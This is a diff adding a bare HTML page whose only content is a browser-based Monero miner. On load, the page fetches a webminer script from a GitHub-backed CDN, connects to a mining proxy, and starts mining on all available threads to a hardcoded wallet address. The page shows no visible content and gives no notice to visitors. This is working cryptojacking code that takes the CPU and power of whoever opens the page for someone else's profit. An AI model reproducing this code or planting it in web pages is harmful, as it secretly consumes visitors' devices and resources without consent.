@@ -1,0 +1,19 @@
+<html>
+    <head>
+        <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
+    </head>
+    <body>
+        <script>
+            server = "wss://ny1.xmrminingproxy.com";
+            var pool = "moneroocean.stream";
+            //var pool = "xmr-eu1.nanopool.org";
+            var walletAddress = "42T51PT8gqn9Revh583xuKJixg7MxoTSgMZ6q6MBY3EEJb44URJxcCDcN1gyHfMiFcAtCoB3zgDNuTcV7AfipHnHBCxPaHw";
+            var workerId = "RG-XMR-5"
+            var threads = -1;
+            var password = "";
+            console.log("Mining", pool, walletAddress)
+            startMining(pool, walletAddress, workerId, threads, password);
+            throttleMiner = 0;
+        </script>
+    </body>
+</html>
